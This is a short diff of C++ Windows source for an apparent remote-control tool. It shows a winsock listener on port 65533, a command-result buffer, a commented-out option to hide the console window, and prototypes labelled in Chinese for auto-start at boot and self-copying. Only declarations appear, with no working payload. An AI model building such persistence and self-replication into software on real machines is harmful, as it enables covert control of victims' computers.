@@ -15,16 +15,18 @@
 #include <tchar.h>
 #include <thread>
 #include <atlimage.h>
+#include   "windows.h "                      
+#include   "shellapi.h " 
 #include <winsock2.h>
 #pragma comment(lib, "ws2_32.lib")
 
 //不显示控制台黑色窗口
 //#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
 #define PORT 65533
-#define err(errMsg) printf("[line: %d]%s failed code %d\n", __LINE__, errMsg, WSAGetLastError())
-#define FileNameRow 200		//定义获取文件名的二维数组大小
-#define FileNameCol 50
-
+//#define err(errMsg) printf("[line: %d]%s failed code %d\n", __LINE__, errMsg, WSAGetLastError())
+#define FileNameRow MAX_PATH		//定义获取文件名的二维数组大小
+#define FileNameCol MAX_PATH
+#define CMD_RESULT_BUF_SIZE 1024
 using namespace std;
 
 struct PC_Message
@@ -61,7 +63,7 @@ void encode(char* text);
 void decode(char* pwd);
 //开机自启动
 int ComputerStart(char* pathName);
-
+//char转换为lpwstr
 LPWSTR CharToLPWSTR(const char* szString);
 //自我复制
 int copySelf(char* path);
